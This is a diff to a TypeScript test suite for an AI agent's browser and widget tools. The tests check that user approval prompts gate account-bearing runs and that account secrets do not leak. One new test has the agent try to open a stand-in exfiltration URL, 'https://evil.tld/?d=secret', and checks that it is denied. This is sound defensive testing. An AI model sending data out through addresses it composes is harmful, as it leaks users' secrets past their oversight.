@@ -301,6 +301,7 @@ test("without an active tab → Aucun onglet actif.", async () => {
 });
 
 test("open_tab on an outside site then read_tab → authorization request", async () => {
+  policy.grantAddress("https://mail.google.com");
   const id = text(await client.callTool({ name: "open_tab", arguments: { url: "https://mail.google.com" } })).trim();
   const r = await client.callTool({ name: "read_tab", arguments: { id } });
   expect(text(r)).toBe("Accès refusé par l'utilisateur à cet onglet.");
@@ -416,6 +417,7 @@ test("launch_app: window left on the old port after the delay, no access granted
 test("navigate an app window to another site: tab opened, the window and its access stay", async () => {
   await withApplications(fakeApp({ state: "running", port: 5280 }), [appTodo]);
   await client.callTool({ name: "launch_app", arguments: { folder: "todo" } });
+  policy.grantAddress("https://exemple.test/");
   const r = await client.callTool({ name: "navigate", arguments: { id: "app:todo", url: "https://exemple.test/" } });
   const isOpen = bridge.calls.find((a) => a.method === "openTab");
   expect(isOpen?.args[0]).toBe("https://exemple.test/");
@@ -507,6 +509,29 @@ async function withWidgets(widgets: WidgetsTools, o: { widgetData?: boolean } = 
 }
 const dataCards = () => bridge.calls.filter((a) => a.method === "askWidgetData");
 
+/**
+ * The declaration gains its account during each run: no card before it (nothing read with the account yet), and what
+ * comes out of the run is held back as for an account owner.
+ */
+function gainsAccount<T extends { read: (id: string) => Promise<any> }>(tools: T, run: "harvest" | "launch"): T {
+  const read = tools.read.bind(tools);
+  const go = (tools as any)[run].bind(tools);
+  let gained = false;
+  tools.read = async (id: string) => {
+    const r = await read(id);
+    const account = gained;
+    gained = false;
+    // A public owner stays public.
+    return r && { ...r, account: r.account && account };
+  };
+  (tools as any)[run] = async (...a: unknown[]) => {
+    const r = await go(...a);
+    gained = true;
+    return r;
+  };
+  return tools;
+}
+
 test("harvest_widget on a public widget returns status and data", async () => {
   const { tools, harvests } = fakeWidgets();
   await withWidgets(tools);
@@ -520,9 +545,19 @@ test("harvest_widget on a public widget returns status and data", async () => {
   expect(dataCards()).toHaveLength(0);
 });
 
-test("harvest_widget on a widget with an account, without a grant: status only, neither data nor log, no card", async () => {
+test("harvest_widget on a widget with an account asks the card before running: refused → no run, no data", async () => {
+  const { tools, harvests } = fakeWidgets();
+  await withWidgets(tools, { widgetData: false });
+  const t = text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
+  expect(t).toContain("refusé");
+  expect(t).not.toContain("secret du compte");
+  expect(harvests).toEqual([]);
+  expect(dataCards()).toHaveLength(1);
+});
+
+test("harvest_widget on a widget that gains its account during the run: status only, neither data nor log, no card", async () => {
   const { tools } = fakeWidgets();
-  await withWidgets(tools, { widgetData: true });
+  await withWidgets(gainsAccount(tools, "harvest"), { widgetData: true });
   const t = text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
   expect(t).toContain('"status": "ok"');
   expect(t).not.toContain("secret du compte");
@@ -549,9 +584,10 @@ test("widget_data on a widget with an account asks for the card; refusal → no 
   expect(harvest).toContain("journal de daily");
   expect(dataCards()).toHaveLength(1);
 
-  // New conversation: the card comes back.
+  // New conversation: the card comes back, before the run too.
   policy.reset();
-  expect(text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }))).not.toContain("secret du compte");
+  expect(text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }))).toContain("secret du compte");
+  expect(dataCards()).toHaveLength(2);
   await client.callTool({ name: "widget_data", arguments: { id: "daily" } });
   expect(dataCards()).toHaveLength(2);
 });
@@ -597,14 +633,14 @@ test("without widgets: the tools do not exist", async () => {
   expect(names).not.toContain("widget_data");
 });
 
-test("harvest_widget on a widget with an account without a grant: an error written by the widget does not leave, the kernel's does", async () => {
+test("harvest_widget on a widget that gains its account during the run: an error written by the widget does not leave, the kernel's does", async () => {
   const { tools } = fakeWidgets();
   let error = "SECRET";
   let kernelFailure: true | undefined;
   tools.harvest = async () => ({
     status: "error", lastUpdate: null, lastAttempt: null, error: error, log: "SECRET", ...(kernelFailure ? { kernelError: kernelFailure } : {}),
   });
-  await withWidgets(tools);
+  await withWidgets(gainsAccount(tools, "harvest"));
   let t = text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
   expect(t).not.toContain("SECRET");
   expect(t).toContain(RESERVED_ERROR);
@@ -618,11 +654,11 @@ test("harvest_widget on a widget with an account without a grant: an error writt
   expect(text(await client.callTool({ name: "harvest_widget", arguments: { id: "meteo" } }))).toContain("SECRET public");
 });
 
-test("harvest_widget, widget with an account without a grant: a widget text that imitates the kernel does not leave, the real kernel message does", async () => {
+test("harvest_widget, widget that gains its account during the run: a widget text that imitates the kernel does not leave, the real kernel message does", async () => {
   const { tools } = fakeWidgets();
   let state: WidgetState = { status: "error", lastUpdate: null, lastAttempt: null };
   tools.harvest = async () => state;
-  await withWidgets(tools);
+  await withWidgets(gainsAccount(tools, "harvest"));
   const harvest = async () => text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
   // Written by the widget (no kernel mark): they carry account data.
   for (const imitation of [
@@ -714,9 +750,9 @@ test("an invalid run id is refused by the schema", async () => {
   expect(r.isError).toBe(true);
 });
 
-test("harvest_widget reports the created run, even for a widget with an account without a grant", async () => {
+test("harvest_widget reports the created run, even for a widget that gains its account during the run", async () => {
   const { tools } = fakeWidgets();
-  await withWidgets(tools, { widgetData: true });
+  await withWidgets(gainsAccount(tools, "harvest"), { widgetData: true });
   const t = text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
   expect(t).toContain('"run": "2026-10-28T10-00-00-000Z"');
   expect(t).not.toContain("secret du compte");
@@ -876,9 +912,17 @@ test("launch_action on an action without an account: status reussie and run id, 
   expect(dataCards()).toHaveLength(0);
 });
 
-test("launch_action with an account and an error written by the code: RESERVED_ACTION_ERROR; kernel error: shown", async () => {
+test("launch_action with an account asks the card before running: refused → not launched", async () => {
+  const { tools, launchedList } = fakeActions();
+  await withActions(tools, { widgetData: false });
+  expect(text(await client.callTool({ name: "launch_action", arguments: { id: "courrier" } }))).toContain("refusé");
+  expect(launchedList).toEqual([]);
+  expect(dataCards()).toHaveLength(1);
+});
+
+test("launch_action, action that gains its account during the run, an error written by the code: RESERVED_ACTION_ERROR; kernel error: shown", async () => {
   const { tools, set: fixer } = fakeActions();
-  await withActions(tools);
+  await withActions(gainsAccount(tools, "launch"));
   fixer({ status: "failed", error: "SECRET du compte" });
   let t = text(await client.callTool({ name: "launch_action", arguments: { id: "courrier" } }));
   expect(t).not.toContain("SECRET");
@@ -892,9 +936,9 @@ test("launch_action with an account and an error written by the code: RESERVED_A
   expect(dataCards()).toHaveLength(0);
 });
 
-test("launch_action with an account: the actions' fixed messages pass, not an identical text written by the code", async () => {
+test("launch_action, action that gains its account during the run: the actions' fixed messages pass, not an identical text written by the code", async () => {
   const { tools, set: fixer } = fakeActions();
-  await withActions(tools);
+  await withActions(gainsAccount(tools, "launch"));
   // Written in English or stored in French: both pass.
   for (const error of [...["fr", "en"].flatMap((l) => [ACTION_WITHOUT_WORKFLOW(l), ACTION_STOPPED(l), RESULT_TOO_BIG(l), INTERNAL_ACTION_ERROR(l), ACTION_UNKNOWN(l)])]) {
     fixer({ status: "failed", error: error, kernelError: true });
@@ -2385,8 +2429,9 @@ test("a fragment the agent adds to a link read is dropped: navigate and read_pag
   }, { address: true });
 });
 
-test("open_tab during a search asks the card for an address not read (with its reason); local and read addresses, or no search, ask nothing", async () => {
-  await withSearch(async ({ call, fake }) => {
+test("open_tab during a search asks the card for an address not read (with its reason); local and read addresses ask nothing", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantAddress("https://ailleurs.fr/");
     expect((await call("open_tab", { url: "https://ailleurs.fr/" })).isError).toBe(false);
     fake.linkSequence = [[a]];
     await call("search_web", { query: "x" });
@@ -2401,6 +2446,55 @@ test("open_tab during a search asks the card for an address not read (with its r
     await call("search_web", { query: "x" });
     expect((await call("open_tab", { url: "https://ailleurs.fr/x", reason: "pour voir" })).isError).toBe(false);
     expect(fake.calls.filter((x) => x.method === "openTab").map((x) => x.args[0])).toEqual(["https://ailleurs.fr/x"]);
+  }, { address: true });
+});
+
+test("outside a search, a composed address asks its card once per conversation; refused, nothing opens; read, local or a readable tab's address is free", async () => {
+  await withSearch(async ({ call, fake }) => {
+    expect((await call("open_tab", { url: "https://evil.tld/?d=secret", reason: "voir" })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toEqual({ url: "https://evil.tld/?d=secret", reason: "voir", agent: "L'agent" });
+    expect((await call("navigate", { id: "github", url: "https://evil.tld/?d=secret" })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.filter((x) => x.method === "openTab" || x.method === "navigate")).toHaveLength(0);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(2);
+    // Free: local, read in a page (read_tab gives its links), the address of a tab it may read, a link by number.
+    expect((await call("open_tab", { url: "http://localhost:3000/" })).isError).toBe(false);
+    await call("read_tab", { id: "github" });
+    expect((await call("open_tab", { url: "https://exemple.fr/a" })).isError).toBe(false);
+    expect((await call("open_tab", { url: github.url })).isError).toBe(false);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(2);
+    // A local page's links are the agent's own writing: never seen, never free (open_tab or navigate by number).
+    const demo = (await call("open_tab", { url: "http://localhost:3001/" })).text.trim();
+    fake.linkSequence = [[{ text: "Annonce", url: "https://exemple.fr/b" }]];
+    expect((await call("read_tab", { id: demo, links: true })).text).toContain("0. Annonce — https://exemple.fr/b");
+    expect((await call("open_tab", { url: "https://exemple.fr/b" })).text).toBe(DENIAL_TEXT);
+    expect((await call("navigate", { id: demo, link: 0 })).text).toBe(DENIAL_TEXT);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(4);
+    // Too long for a card.
+    expect((await call("open_tab", { url: `https://ailleurs.fr/${"x".repeat(600)}` })).text).toBe("Adresse trop longue (500 caractères au plus).");
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(4);
+  }, { address: false, allow: true });
+  await withSearch(async ({ call, fake, policy }) => {
+    expect((await call("open_tab", { url: "https://ailleurs.fr/x", reason: "r" })).isError).toBe(false);
+    expect((await call("open_tab", { url: "https://ailleurs.fr/x" })).isError).toBe(false);
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(1);
+    // A new conversation asks again.
+    policy.reset();
+    await call("open_tab", { url: "https://ailleurs.fr/x" });
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(2);
+  }, { address: true });
+});
+
+test("read_pages of a local page in a search does not make its links seen: outside the search, they still ask the card", async () => {
+  await withSearch(async ({ call, fake, search }) => {
+    const far = { text: "Loin", url: "https://loin.fr/x" };
+    fake.linkSequence = [[far]];
+    // Without a search, the first address opens the search tab: only the local page is read.
+    expect((await call("read_pages", { urls: ["http://localhost:5300/demo.html"] })).isError).toBe(false);
+    expect(fake.calls.filter((x) => x.method === "readText").length).toBeGreaterThan(0);
+    search.reset();
+    const before = fake.calls.filter((x) => x.method === "askAddress").length;
+    await call("open_tab", { url: far.url });
+    expect(fake.calls.filter((x) => x.method === "askAddress")).toHaveLength(before + 1);
   }, { address: true });
 });
 
@@ -2685,6 +2779,7 @@ describe("agent activity", () => {
   test("read_tab, navigate and capture_screen say what they do, with the host without www.", async () => {
     await startActivity();
     await client.callTool({ name: "read_tab", arguments: { id: "lbc" } });
+    policy.grantAddress("https://www.exemple.fr/y");
     await client.callTool({ name: "navigate", arguments: { id: "lbc", url: "https://www.exemple.fr/y" } });
     await client.callTool({ name: "capture_screen", arguments: { id: "lbc" } });
     expect(seenActivity).toEqual([
